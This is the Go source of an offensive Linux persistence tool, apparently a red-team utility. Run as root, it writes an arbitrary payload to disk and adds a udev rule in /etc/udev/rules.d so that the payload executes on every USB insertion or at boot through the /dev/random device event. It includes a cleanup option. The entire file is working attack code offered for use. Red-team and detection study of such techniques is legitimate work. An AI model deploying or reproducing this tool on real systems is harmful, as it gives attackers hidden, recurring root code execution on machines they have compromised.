// This Go program establishes persistence on a Linux system by creating a udev rule
// that triggers the execution of a specified payload (binary or script)
// either when a USB device is inserted or on system boot (using /dev/random).
// It also provides a cleanup option to remove the persistence.

package main

import (
	"flag"
	"fmt"
	"os"
	"os/user"

	"github.com/fatih/color"
)

var goodTick = color.GreenString("[+] ")
var badTick = color.RedString("[!] ")

func checkRoot() {
	// Check if running as root
	currentUser, err := user.Current()
	if err != nil {
		fmt.Println(badTick, "Error getting current user:", err)
		os.Exit(1)
	}

	if currentUser.Uid != "0" {
		fmt.Println(badTick, "Error: must be run as root")
		os.Exit(1)
	}

}

// Write the /etc/udev/rules.d/<filename>.rules
func writeUdevRule(ruleContent string, rulesnamePtr *string) {
	err := os.WriteFile("/etc/udev/rules.d/"+*rulesnamePtr, []byte(ruleContent), 0644)
	if err != nil {
		fmt.Println(badTick, "Error writing udev rule:", err)
		os.Exit(1)
	}
	fmt.Println(goodTick, "Added udev rule:", *rulesnamePtr)

}

// Write the payload that will be executed as persistence
func writePayload(payloadPtr *[]byte, filenamePtr *string) {
	err := os.WriteFile(*filenamePtr, *payloadPtr, 0755)
	if err != nil {
		fmt.Println(badTick, "Error writing payload file:", err)
		os.Exit(1)
	}
	fmt.Println(goodTick, "Added persistence payload:", *filenamePtr)

}

func cleanUp(filenamePtr *string, rulesnamePtr *string) {
	// Remove the payload file
	err := os.Remove(*filenamePtr)
	if err != nil {
		fmt.Println(badTick, "Error removing payload file:", err)
	} else {
		fmt.Println(goodTick, "Removed payload file:", *filenamePtr)

	}

	// Remove the udev rule
	err = os.Remove("/etc/udev/rules.d/" + *rulesnamePtr)
	if err != nil {
		fmt.Println(badTick, "Error removing udev rule:", err)
	} else {
		fmt.Println(goodTick, "Removed udev rule:", *rulesnamePtr)
	}
}

func main() {
	fmt.Println(`
	
	                                                                                     
                                                 .,;,.                               
                                               'KMMMMM0.                             
                                   ,oOXNWWWWWWWMMMMMMMMX                             
                                 cXMWOl::::::::xMMMMMMMo                             
                               cXMWd.           'oO0ko.                              
      .;lll:'                cXMWd.                                                  
   .oNMMMMMMMWx.           lNMWd.                                         ,          
  .NMMMMMMMMMMMW:       .lNMNo.   USP x udev: Persistance is the key     .MWOl.      
  OMMMMMMMMMMMMMWOOOOOOKWMMMKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MMMMMNx:.  
  kMMMMMMMMMMMMMNxxxxxxxxxxxxxxxxxONMMMXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxOMMMMMKd,   
  .XMMMMMMMMMMMW;                   ,0MMO'                               .MNx:.      
    cKMMMMMMMNd.                      'OMMO,                              .          
      .,:c:,.                           ,OMM0'                                       
                                          'OMM0,          dXXXXXXXK.                 
                                            'OMMKxlllllllcXMMMMMMMM.                 
                                              .:x0XXXXXXXXWMMMMMMMM.                 
                                                          OMMMMMMMM.                 
                                                          .,,,,,,,,                  
                                                                                     

	`)
	checkRoot()

	// Define command-line flags
	filenamePtr := flag.String("f", "/persistence", "/path/to/location of binary to be installed at")
	payloadPtr := flag.String("p", "./example_payload.sh", "Path to the payload file (binary or script) that will be executed")
	rulesnamePtr := flag.String("r", "75-persistence.rules", "Name of the persistence rules file")
	usbPtr := flag.Bool("usb", false, "Enable USB persistence")
	randomPtr := flag.Bool("random", false, "Executes when /dev/random is loaded (on reboot)")
	cleanupPtr := flag.Bool("c", false, "Cleanup persistence")

	// Parse the flags
	flag.Parse()

	if *cleanupPtr {
		cleanUp(filenamePtr, rulesnamePtr)
		os.Exit(0)
	}

	if !*usbPtr && !*randomPtr {
		fmt.Println(badTick, "Please specify a persistence method -usb or -random")
		flag.Usage()
		os.Exit(1)

	} else {
		// Check if the payload file exists
		if _, err := os.Stat(*payloadPtr); os.IsNotExist(err) {
			fmt.Println(badTick, "Error: Payload file not found:", *payloadPtr)
			os.Exit(1)
		}

		// Read the payload from the file
		payload, err := os.ReadFile(*payloadPtr)
		if err != nil {
			fmt.Println(badTick, "Error reading payload file:", err)
			os.Exit(1)
		}

		if *usbPtr {
			fmt.Println(goodTick, "Adding USB persistence")
			ruleContent := fmt.Sprintf("SUBSYSTEMS==\"usb\", RUN+=\"%s\"", *filenamePtr)
			writePayload(&payload, filenamePtr)
			writeUdevRule(ruleContent, rulesnamePtr)
		}
		if *randomPtr {
			fmt.Println(goodTick, "Adding /dev/random persistence")
			ruleContent := fmt.Sprintf("ACTION==\"add\", ENV{MAJOR}==\"1\", ENV{MINOR}==\"8\", RUN+=\"%s\"", *filenamePtr)
			writePayload(&payload, filenamePtr)
			writeUdevRule(ruleContent, rulesnamePtr)

		}
	}
}
